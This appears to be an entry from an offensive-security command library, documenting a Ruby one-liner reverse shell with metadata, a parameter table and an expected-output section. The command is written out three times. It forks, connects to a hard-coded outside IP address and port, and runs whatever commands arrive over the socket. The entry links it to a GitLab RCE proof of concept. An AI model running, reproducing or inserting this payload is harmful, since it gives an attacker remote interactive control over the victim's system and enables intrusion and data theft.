---
data: >-
  ruby -rsocket -e exit if
  fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
  io.read}end
tags:
  - reverse-shell
  - ruby
type: command
executor: ruby
platforms:
  - Linux
id: a573cc72-4db0-40b7-b058-d74a790200ef
created_at: '2025-12-11T06:10:22.436Z'
updated_at: '2025-12-11T06:10:22.436Z'
verified: false
validated: true
submitted: true
---
# ruby-reverse-shell

## Command

```ruby
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

## Description

Establishes a reverse shell by connecting to a remote host and executing received commands, used in the GitLab RCE PoC for interactive access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-e` | Executes the following code | Yes |
| `-rsocket` | Requires socket library | Yes |
| `TCPSocket.new("103.3.61.137",12345)` | Connects to IP and port | Yes |

## Examples

### Basic Usage

```ruby
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

## Expected Output

Reverse shell connection established, allowing remote command execution.

## Related

- [[procedures/Establish-Reverse-Shell-via-Uploaded-PoC]]
